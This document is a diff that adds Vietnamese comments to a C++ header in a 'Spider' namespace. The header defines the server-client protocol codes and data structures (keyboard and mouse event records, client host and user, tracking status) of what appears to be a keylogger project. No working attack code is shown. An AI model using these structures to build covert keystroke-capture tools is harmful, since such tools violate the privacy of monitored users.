@@ -3,8 +3,10 @@
 
 namespace Spider
 {
+    // tạo enum RequestCode để giao diện giữa server và client
     enum RequestCode
     {
+
         /* Server requests */
         PING = 0,
         ASK_ID,
@@ -56,7 +58,7 @@ namespace Spider
         ERROR_SET_FREQUENCY,
         ERROR_GET_STATUS
     };
-
+    // tạo  enum ClickType để giao diện giữa server và client
     enum ClickType
     {
         NONE = 0,
@@ -64,13 +66,14 @@ namespace Spider
         RIGHT,
         OTHER
     };
-
+    // tạo struct t_client_id lưu địa chỉ host và user
     struct t_client_id
     {
         char host[256];
         char user[256];
     };
 
+    // tạo struct lưu dữ liệu mouse và keyboard
     struct t_mouse_event
     {
         int timestamp;
@@ -86,7 +89,7 @@ namespace Spider
         char procname[256];
         int key;
     };
-
+    // tạo struct lưu dữ liệu status
     struct t_status
     {
         bool keyboard_tracking;
